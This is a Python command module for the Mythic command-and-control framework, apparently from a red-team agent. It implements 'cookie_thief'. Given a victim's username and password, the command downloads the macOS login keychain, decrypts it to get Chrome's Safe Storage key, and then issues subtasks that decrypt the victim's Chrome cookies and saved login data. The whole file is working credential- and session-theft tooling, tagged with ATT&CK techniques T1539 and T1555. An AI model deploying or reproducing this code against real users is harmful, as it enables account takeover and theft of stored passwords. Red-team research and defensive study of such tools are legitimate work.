from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import sys
from mythic_container.logging import logger


class CookieThiefArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                display_name="User Login Password",
                name="password",
                type=ParameterType.String,
                description="p@55w0rd_here for user login",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        ui_position=1
                    )
                ]
            ),
            CommandParameter(
                name="browser",
                type=ParameterType.ChooseOne,
                choices=["chrome"],
                description="choose the browser to steal cookies from",
                default_value="chrome",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        ui_position=2
                    )
                ]
            ),
            CommandParameter(
                name="username",
                type=ParameterType.String,
                description="Victim's username from whom to steal the cookies",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        ui_position=3
                    )
                ]
            ),
        ]

    async def parse_arguments(self):
        self.load_args_from_json_string(self.command_line)


async def downloads_complete(completionMsg: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    response = PTTaskCompletionFunctionMessageResponse(Success=True)
    files = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
        TaskID=completionMsg.TaskData.Task.ID,
        LimitByCallback=True,
        Filename="login.keychain-db",
        IsDownloadFromAgent=True,
        IsPayload=False,
        IsScreenshot=False,
    ))
    if files.Success:
        for f in files.Files:
            if f.TaskID == completionMsg.TaskData.Task.ID:
                # we found a login.keychain-db file from our subtask
                await SendMythicRPCFileUpdate(MythicRPCFileUpdateMessage(
                    AgentFileID=f.AgentFileId,
                    Comment=completionMsg.TaskData.args.get_arg('username')
                ))
                decryptTask = await SendMythicRPCTaskCreateSubtask(MythicRPCTaskCreateSubtaskMessage(
                    TaskID=completionMsg.TaskData.Task.ID,
                    CommandName="decrypt_keychain",
                    Params=json.dumps({
                        "password": completionMsg.TaskData.args.get_arg('password'),
                        "username": completionMsg.TaskData.args.get_arg('username'),
                        "file_id": f.AgentFileId
                    }),
                    SubtaskCallbackFunction="decrypt_complete"
                ))
                if not decryptTask.Success:
                    await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                        TaskID=completionMsg.TaskData.Task.ID,
                        Response=decryptTask.Error.encode()
                    ))
                    response.Success = False
                    response.TaskStatus = "error: Failed to issue decryption subtask"
                    response.Stderr = decryptTask.Error
                    return response
                return response
        response.Success = False
        response.TaskStatus = "error: Failed to find keychain file"
        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
            TaskID=completionMsg.TaskData.Task.ID,
            Response="error: Failed to find keychain file".encode()
        ))
        return response
    else:
        response.Success = False
        response.TaskStatus = "error: Failed to search for files"
        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
            TaskID=completionMsg.TaskData.Task.ID,
            Response=f"error: Failed to search for files: {files.Error}".encode()
        ))
        return response


async def decrypt_complete(completionMsg: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    # now we should have some credentials, specifically the chrome safe storage credential
    # task is the cookie_thief command, subtask is the result of my decrypt_keychain command
    response = PTTaskCompletionFunctionMessageResponse(Success=True)
    chrome_password = await SendMythicRPCCredentialSearch(MythicRPCCredentialSearchMessage(
        TaskID=completionMsg.TaskData.Task.ID,
        Credential=MythicRPCCredentialData(
            account="Chrome",
            realm="Chrome Safe Storage",
            comment=completionMsg.TaskData.args.get_arg('username')
        )
    ))
    if chrome_password.Success:
        if len(chrome_password.Credentials) > 0:
            files = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
                TaskID=completionMsg.TaskData.Task.ID,
                Filename="Cookies",
                IsDownloadFromAgent=True,
                LimitByCallback=True
            ))
            if files.Success:
                if len(files.Files) > 0:
                    for f in files.Files:
                        if f.TaskID == completionMsg.TaskData.Task.ID:
                            await SendMythicRPCTaskCreateSubtask(MythicRPCTaskCreateSubtaskMessage(
                                TaskID=completionMsg.TaskData.Task.ID,
                                CommandName="decrypt_chrome_cookies",
                                Params=json.dumps({
                                    "username": completionMsg.TaskData.args.get_arg('username'),
                                    "password": chrome_password.Credentials[0].Credential,
                                    "file_id": f.AgentFileId
                                }),
                                SubtaskCallbackFunction="decrypted_cookies"
                            ))
                else:
                    await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                        TaskID=completionMsg.TaskData.Task.ID,
                        Response=f"No 'Cookies' file detected from Task {completionMsg.SubtaskData.Task.ID}\n".encode()
                    ))
            else:
                response.Success = False
                response.Error = files.Error
                return response
            files = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
                TaskID=completionMsg.TaskData.Task.ID,
                Filename="Login Data",
                LimitByCallback=True,
                IsDownloadFromAgent=True,
            ))
            if files.Success:
                if len(files.Files) > 0:
                    for f in files.Files:
                        if f.TaskID == completionMsg.TaskData.Task.ID:
                            await SendMythicRPCTaskCreateSubtask(MythicRPCTaskCreateSubtaskMessage(
                                TaskID=completionMsg.TaskData.Task.ID,
                                CommandName="decrypt_chrome_login_data",
                                Params=json.dumps({
                                    "username": completionMsg.TaskData.args.get_arg('username'),
                                    "password": chrome_password.Credentials[0].Credential,
                                    "file_id": f.AgentFileId
                                }),
                                SubtaskCallbackFunction="decrypted_cookies"
                            ))
                else:
                    await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                        TaskID=completionMsg.TaskData.Task.ID,
                        Response=f"No 'Login Data' file detected from Task {completionMsg.SubtaskData.Task.ID}\n".encode()
                    ))
            else:
                response.Success = False
                response.Error = files.Error
                return response
        else:
            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=completionMsg.TaskData.Task.ID,
                Response=f"Failed to find a chrome storage password for {completionMsg.TaskData.args.get_arg('username')}".encode()
            ))
            response.Success = False
            response.Error = "Error: Failed to Find Chrome Storage Password"
            return response
    else:
        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
            TaskID=completionMsg.TaskData.Task.ID,
            Response=f"Failed to search for passwords: {chrome_password.Error}".encode()
        ))
        response.Success = False
        response.Error = "Error: Failed to Find Chrome Storage Password"
        return response
    return response


async def decrypted_cookies(completionMsg: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    response = PTTaskCompletionFunctionMessageResponse(Success=True, TaskStatus="success")
    return response


class CookieThiefCommand(CommandBase):
    cmd = "cookie_thief"
    needs_admin = False
    help_cmd = "cookie_thief -password \"user account password\" -browser {browser} -username {username}"
    description = "Downloads the keychain db and browser cookies, decrypts the keychain, extracts the cookie key and decrypts the cookies."
    version = 1
    supported_ui_features = [""]
    author = "@antman"
    parameters = []
    attackmapping = ["T1539", "T1555"]
    argument_class = CookieThiefArguments
    browser_script = BrowserScript(script_name="cookie_thief", author="@antman1p")
    completion_functions = {
        "downloads_complete": downloads_complete,
        "decrypt_complete": decrypt_complete,
        "decrypted_cookies": decrypted_cookies
    }

    async def create_go_tasking(self, taskData: MythicCommandBase.PTTaskMessageAllData) -> MythicCommandBase.PTTaskCreateTaskingMessageResponse:
        response = MythicCommandBase.PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        response.CompletionFunctionName = "downloads_complete"
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
